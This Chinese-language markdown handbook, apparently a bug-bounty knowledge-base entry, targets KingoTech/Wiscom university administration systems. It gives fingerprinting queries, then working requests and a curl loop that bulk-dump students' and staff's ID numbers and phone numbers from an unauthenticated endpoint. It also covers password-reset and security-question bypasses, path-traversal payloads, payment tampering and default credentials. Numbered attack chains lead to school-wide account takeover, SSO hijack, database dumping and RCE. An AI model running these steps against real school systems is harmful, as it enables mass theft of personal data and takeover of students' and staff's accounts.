---
name: kb_jinzhi_master
description: 金智教育(Wiscom/KingoTech)教务系统漏洞手册 — 产品线/指纹识别/已知漏洞/测试流程/默认口令/攻击链
metadata:
  type: reference
  product: 金智教育教务系统 (KingoTech/Wiscom)
  vendor: 江苏金智教育信息股份有限公司
  updated: 2026-06-20
  note: 不含源码审计，基于公开漏洞+SRC实战+知识库整合
---

# 金智教育 (KingoTech / Wiscom) 教务系统漏洞手册

## 一、产品线与架构

### 1.1 产品矩阵

| 产品 | 定位 | 常见路径 |
|------|------|----------|
| WISP 教务管理系统 | 核心教务 | `/wiscom/`, `/jw/`, `.portal` |
| 统一身份认证系统 | SSO/认证 | CAS/OAuth 风格, `/FpAuth/AuthCheck` |
| 融合门户 | 校园门户 | `.portal`, `/portal/` |
| 学工系统(今日校园) | 学生管理 APP | 移动端为主 |
| 网上办事服务大厅 | 一站式服务 | `/serviceHall/`, `/ehall/` |
| 支付系统 | 校园支付 | `/pay/` |
| 人才招聘系统 | 招聘管理 | `/recruit/` |
| 建站系统 | CMS | 无固定路径 |

### 1.2 技术栈

```
语言: Java (主) + JSP
框架: Spring / Spring Boot (新版本)
认证: 挑战-应答(challenge-response)机制 + SSO Token
数据库: Oracle / MySQL (版本相关)
中间件: Tomcat (Embed Core)
前端: RESTful API + JSON
```

### 1.3 版本识别

```
老版本 (2010版): portal 后缀, 简单 JSP, 密保问题可绕过
中期版本: /wiscom/, RESTful API, JSESSIONID
新版本: /FpAuth/AuthCheck, challenge-response 认证, 动态 Token
```

---

## 二、指纹识别

### 2.1 FOFA 搜索

```
body="kingotech"
body="金智教育"
body="金智"
body="wiscom"
body="Wiscom"
title="金智教务管理系统"
icon_hash="xxx"  # 金智特定 favicon
```

### 2.2 URL 路径特征

```
# 核心路径
/wiscom/                         # WISP 教务
/FpAuth/AuthCheck                # 统一认证
/authorizeUsers.portal           # 老版用户信息接口
/cas/                            # CAS 认证
/serviceHall/                    # 网上办事大厅
/portal/                         # 门户

# 页面后缀
*.portal                         # 老版门户页面
*.do                             # Struts 风格 (老版)
/api/                            # RESTful API (新版)
```

### 2.3 响应特征

```
- HTML title: "金智教务管理系统" / "金智教育"
- HTML meta: "KingoTech" / "Wiscom"
- Cookie: JSESSIONID (Java)
- 认证: 挑战-应答(challenge-response) / 动态 Token
- JSON 响应格式: {"code":0,"data":...} / {"success":true,...}
- Server: Apache-Coyote / nginx
```

### 2.4 JS 特征

```
- 前端加密: RSA/AES 密码加密
- 统一认证 JS: /FpAuth/js/auth.js
- Token 机制: access_token + refresh_token
```

---

## 三、已知漏洞

### 3.1 统一身份认证 — 任意密码重置 (CNVD-2018-17443)

| 属性 | 值 |
|------|-----|
| 漏洞类型 | 逻辑设计缺陷 |
| 危害等级 | 高危 |
| 影响 | 可重置任意账号密码 |
| 修复版本 | 6.2.4+ |

**利用思路**: 密码重置流程中身份验证步骤缺失，可跳过密保/手机验证直接修改密码。

**测试方法**:
```
1. 密码重置流程 Step1: 输入目标学号
2. 拦截 Step2 (验证密保/手机) 请求 → 直接跳过
3. 直接发送 Step3 (设置新密码) 请求
4. 检查是否不需要 Step2 的验证 token
```

### 3.2 老版门户 — 未授权用户信息遍历

| 属性 | 值 |
|------|-----|
| 影响版本 | 2010版融合门户 |
| 认证 | 无认证 |

**POC**:
```
GET /authorizeUsers.portal?limit=1000 HTTP/1.1
Host: target.edu.cn

# 返回 JSON 格式的全校师生信息:
# 包含: 学号/工号、姓名、身份证号、手机号、部门/院系
```

**利用**:
```bash
# 批量获取
for i in $(seq 0 100 10000); do
    curl -sk "https://target/authorizeUsers.portal?limit=100&start=${i}" | jq '.'
done
```

### 3.3 老版门户 — 密保问题绕过 + 批量改密

**攻击链**:
```
Step 1: /authorizeUsers.portal 获取全校师生列表
Step 2: 密码修改接口绕过密保验证
Step 3: 批量修改全校师生密码
```

**密码修改绕过手法**:
```
方式1: 直接跳过密保验证步骤
  POST /changePassword.portal
  → 删除密保答案参数 → 直接提交新密码

方式2: 密保答案爆破
  老系统密保问题通常为固定题库:
   - 母亲姓名/父亲姓名 → 可从学籍信息推断
   - 出生地/小学名称 → 社工可得

方式3: 空密保答案
  answer="" / answer=null → 后端未校验空值
```

### 3.4 SQL 注入

| 产品 | 确认情况 | 注入位置 |
|------|---------|----------|
| 人才招聘系统 | CNVD 确认 | 简历搜索/筛选参数 |
| 老版门户 | 可能有 | 搜索框/信息查询 |
| 网上办事大厅 | 可能有 | 申请单查询参数 |

**探测重点**:
```
所有查询/搜索/筛选/排序参数 — 同上方法论
尤其关注:
  ?keyword= / ?search= / ?filter= / ?sort= / ?page=
  JSON body: {"keyword":..., "sortField":..., "filter":...}
  portal 接口: *.portal?参数1=值1&参数2=值2
```

**数据库差异**:
- 老版本: 可能 Oracle (和正方类似)
- 新版本: 多为 MySQL
- 先判断 DBMS 再选 payload

### 3.5 目录遍历

| 产品 | 漏洞 | 状态 |
|------|------|------|
| 建站系统 | 目录遍历 | CNVD 确认 |

**测试**:
```
?path=../../WEB-INF/web.xml
?file=../../etc/passwd
?template=../config/database.properties
```

### 3.6 信息披露

| 产品 | 信息 | 状态 |
|------|------|------|
| 网上办事服务大厅 | 信息披露 | CNVD 确认 |

**可能泄露内容**: API 端点、内部IP、用户敏感字段

### 3.7 支付系统逻辑缺陷

| 产品 | 漏洞 | 状态 |
|------|------|------|
| 支付系统 | 逻辑缺陷 | CNVD 确认 |

**测试方向**:
- 金额篡改 (修改支付金额为 0.01)
- 支付状态伪造 (未付款标记为已付款)
- 回调验证缺失

### 3.8 组件风险

统一模拟登录 API (开源逆向 `wisedu-unified-login-api`) 暴露了 18 个缺陷组件:
- Apache Tomcat Embed Core 高危漏洞
- Spring Framework 组件已知 CVE
- Jackson/JSON 库反序列化风险

其中 Tomcat Embed Core 老版本可能包含:
- CVE-2017-12615 (PUT 任意文件上传)
- CVE-2021-44228 (Log4j2, 如果使用)
- 其他 Tomcat 历史 RCE

---

## 四、默认口令

| 系统 | 默认用户名 | 默认密码 |
|------|-----------|---------|
| 金智教务 | 学号 | 身份证后6位 |
| 金智教务 | 学号 | 学号 |
| 金智教务 | 学号 | 123456 |
| 金智统一认证 | 学号 | 统一初始密码 |
| 金智统一认证 | admin | admin |
| 金智融合门户 | 学号 | 身份证后6位 |
| 今日校园APP | 学号+密码 | 同统一认证 |

---

## 五、认证机制分析

### 5.1 挑战-应答 (Challenge-Response) 机制

新版金智统一认证使用动态 Token 机制:

```
登录流程:
1. 客户端发送: POST /FpAuth/AuthCheck  → {"username":"学号"}
2. 服务端返回: {"challenge":"随机字符串", "token":"...", "publicKey":"RSA公钥"}
3. 客户端使用 publicKey 加密 password+challenge
4. 客户端发送: POST /FpAuth/AuthCheck → {"username":"","encryptedPassword":"","token":""}
5. 服务端验证 → 返回 session/access_token
```

**安全分析**:
- challenge 是否真正随机？(可重放吗？)
- publicKey 是否可被替换？(中间人？)
- token 是否有时效限制？
- 密文是否包含 challenge？(不包含 = 重放攻击)

### 5.2 SSO Token 机制

```
认证成功后:
- 返回 access_token (JWT 或 opaque)
- Cookie 设置 JSESSIONID
- 跨系统 SSO 通过 token 传递

测试重点:
- JWT 是否可解密/篡改？
- token 是否有签名验证？
- 是否校验 aud/iss？
- 跨系统 token 是否可复用？
```

---

## 六、攻击链

### 攻击链 #1: 用户信息遍历 → 批量密码重置 (P0 最高)
```
/authorizeUsers.portal?limit=1000
→ 获取全校学号+姓名+手机号+身份证号
→ 已知默认密码(身份证后6位/学号)
→ 批量登录 / 通过密码重置漏洞批量接管
```

### 攻击链 #2: 统一认证绕过 → 全校 SSO 接管 (P0)
```
统一认证任意密码重置 (CNVD-2018-17443)
→ 重置管理员 SSO 密码
→ 登录统一认证 → 跨系统访问所有接入 SSO 的业务
→ 教务系统/学工系统/邮箱/一卡通/图书馆
```

### 攻击链 #3: 老版 portal 组合利用 (P0)
```
/authorizeUsers.portal 遍历用户
→ 密保问题绕过 / 空答案绕过
→ 批量修改密码
→ 全校账户接管
```

### 攻击链 #4: SQL 注入 → 脱库 (P1)
```
搜索/查询参数 SQL 注入
→ Oracle/MySQL 注入 → UNION/报错/盲注
→ 脱用户表 → 全校师生信息
→ 管理员密码 hash → 破解 → 后台控制
```

### 攻击链 #5: 组件漏洞 → RCE (P1)
```
Tomcat Embed Core 老版本 CVE
→ PUT 文件上传 / 反序列化 RCE
→ 服务器控制 → 内网横向
```

---

## 七、测试流程

### Step 1: 指纹确认 (30秒)
```bash
curl -sk "TARGET" | grep -iE "金智|kingotech|wiscom|wisp"
curl -sk "TARGET/FpAuth/AuthCheck" -o /dev/null -w "%{http_code}"
curl -sk "TARGET/wiscom/" -o /dev/null -w "%{http_code}"
```

### Step 2: 版本判断 (1分钟)
```
□ HTML 中搜索 "金智" → 确认厂商
□ 尝试 /authorizeUsers.portal → 200 = 老版门户
□ 尝试 /FpAuth/AuthCheck → JSON 响应 = 新版认证
□ 尝试 /wiscom/ → 判断 WISP 教务
□ 看 JS 文件: 搜 RSA/AES 加密 → 新版特征
```

### Step 3: 未授权/信息泄露测试 (2分钟)
```bash
# 老版用户遍历
curl -sk "TARGET/authorizeUsers.portal?limit=10"

# Swagger/API文档
curl -sk "TARGET/swagger-ui.html" -o /dev/null -w "%{http_code}"
curl -sk "TARGET/v2/api-docs" -o /dev/null -w "%{http_code}"

# Actuator
curl -sk "TARGET/actuator" -o /dev/null -w "%{http_code}"
curl -sk "TARGET/actuator/env" -o /dev/null -w "%{http_code}"

# Druid
curl -sk "TARGET/druid/index.html" -o /dev/null -w "%{http_code}"
```

### Step 4: 认证测试 (2分钟)
```
□ 默认口令测试 (学号/身份证后6位)
□ 密码重置流程绕过
□ SSO Token 分析
□ 验证码是否可绕过
```

### Step 5: 功能点遍历 + 参数测试 (主体时间)
```
按 vuln-discovery-methodology 执行
重点: 任何查询/搜索/筛选接口的参数
```

---

## 八、与正方教务的区别

| 维度 | 正方教务 | 金智教务 |
|------|---------|---------|
| 代码审计 | ✅ 已完成 | ❌ 无 |
| SQL 注入确定性 | ⭐⭐⭐⭐⭐ 确认多处 | ⭐⭐⭐ 部分系统确认 |
| 最佳攻击入口 | DWR SQL 注入 | 统一认证逻辑漏洞 + 老版门户遍历 |
| 认证机制 | Session (JSESSIONID) | 统一认证(challenge-response/SSO) |
| 漏洞面倾向 | SQL 注入 > 文件操作 | 认证逻辑 > 信息泄露 > 组件风险 |
| 公开 POC 数量 | 较多 | 较少 |
| 最脆弱版本 | 4.4.4 (DWR) | 2010版门户 |

---

## 九、关键待补全信息

以下是通过代码审计或进一步实战需要补全的:

```
□ WISP 教务系统源码审计 (如有获取渠道)
□ 统一认证 challenge-response 的绕过方法
□ 各个版本的准确路径差异
□ 新版系统 (2022+) 的漏洞面
□ 数据库类型/版本确认 (Oracle vs MySQL)
□ JWT/Cookie Token 的签名密钥泄露
□ API 接口的完整枚举 (swagger/actuator 存在率)
```

---

## 十、关联知识库

- [[kb_oa_systems_poc_2026]] — OA 系统 POC 合集
- [[edu_src_jiaowu]] — 教务系统专有漏洞
- [[kb_edu_systems]] — 教育行业系统漏洞全集
- [[kb_edu_credentials]] — 教育系统默认密码
- [[kb_edu_auth_bypass]] — 教育系统认证绕过
- [[kb_edu_vulns]] — 教育系统通用漏洞
- [[kb_src_recon]] — SRC 资产测绘
- [[kb_src_idor_logic]] — 越权与逻辑漏洞
- [[vuln-discovery-methodology]] — 漏洞发现方法论
